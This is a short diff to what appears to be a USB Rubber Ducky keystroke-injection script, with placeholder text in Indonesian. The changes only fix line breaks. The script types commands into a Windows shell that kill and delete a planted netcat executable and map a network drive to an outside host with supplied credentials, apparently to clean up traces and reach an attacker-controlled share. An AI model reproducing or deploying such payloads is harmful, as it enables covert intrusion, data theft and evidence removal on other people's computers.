@@ -13,7 +13,8 @@ STRING cmd
 DELAY 1000
 ENTER
 DELAY 500
-STRING taskkill /f /pid nc.exeDELAY 200
+STRING taskkill /f /pid nc.exe
+DELAY 200
 ENTER
 DELAY 200
 STRING del c:\Users\Public\Downloads\nc.exe
@@ -24,8 +25,7 @@ STRING net use z: /delete
 DELAY 200
 ENTER
 DELAY 200
-STRING net use z: \\(ip public / domain / sub domain)\(nama folder yang dishare) /u:(username)
-(password)
+STRING net use z: \\(ip public / domain / sub domain)\(nama folder yang dishare) /u:(username) (password)
 DELAY 200
 ENTER
 DELAY 200
